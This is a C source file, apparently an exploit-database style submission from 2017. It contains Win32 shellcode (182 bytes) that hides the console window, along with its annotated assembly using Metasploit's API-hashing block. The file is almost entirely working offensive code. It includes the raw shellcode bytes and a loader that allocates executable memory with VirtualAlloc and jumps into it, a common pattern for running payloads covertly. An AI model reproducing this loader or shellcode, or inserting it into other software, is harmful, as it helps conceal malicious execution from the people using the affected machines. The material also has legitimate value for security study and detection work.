/*

MIT License

Copyright (c) 2017 Ege Balcı

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.



# Win32 - Hide Console Window Shellcode (182 BYTES)
# Date: [11.03.2017]
# Author: [Ege Balcı]
# Tested on: [Win XP/Vista/7/8/8.1/10]

@egeblc

------------------------------------------------------------------

This shellcode will hide the console window...

[BITS 32]
[ORG 0]


pushad                  ; Save all register to stack
pushfd                  ; Save all flags to stack
cld
call Start
%include "API-BLOCK.asm"; Stephen Fewer's hash API from metasploit project

Start:
    pop ebp             ; Pop the address of SFHA

    push 0x00000000	    ; Push the byte 'user32' ,0,0
    push 0x00003233     ; ...
    push 0x72657375     ; ...
    push esp            ; Push a pointer to the "user32" string on the stack.
    push 0x0726774C     ; hash( "kernel32.dll", "LoadLibraryA" )
    call ebp            ; LoadLibraryA( "user32" )
    add esp,0x0C        ; Clear the stack

    push 0xCE726E89     ; hash("user32.dll", "GetConsoleWindow")
    call ebp            ; GetConsoleWindow();

    push 0x00000000	    ; 0
    push eax            ; Console window handle
    push 0x6E2EEBC2	    ; hash(User32.dll, ShowWindow)
    call ebp		        ; ShowWindow(HANDLE,SW_HIDE);

    popfd               ; Pop back all saved flags
    popad               ; Pop back all saved registers
    ret                 ; Return

*/
#include <windows.h>
#include <stdio.h>

unsigned char Shellcode[] = {
  0x60, 0x9c, 0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31,
  0xc0, 0x64, 0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b,
  0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c,
  0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57,
  0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48,
  0x01, 0xd1, 0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3,
  0x3a, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf,
  0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d,
  0x24, 0x75, 0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c,
  0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89,
  0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f,
  0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x00, 0x68, 0x33, 0x32,
  0x00, 0x00, 0x68, 0x75, 0x73, 0x65, 0x72, 0x54, 0x68, 0x4c, 0x77, 0x26,
  0x07, 0xff, 0xd5, 0x83, 0xc4, 0x0c, 0x68, 0x89, 0x6e, 0x72, 0xce, 0xff,
  0xd5, 0x6a, 0x00, 0x50, 0x68, 0xc2, 0xeb, 0x2e, 0x6e, 0xff, 0xd5, 0x9d,
  0x61, 0xc3
};



void ExecuteShellcode();


int main(int argc, char const *argv[])
{
	ExecuteShellcode();
	getchar();
	return 0;
}


void ExecuteShellcode(){
	char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(BUFFER, Shellcode, sizeof(Shellcode));
	(*(void(*)())BUFFER)();
}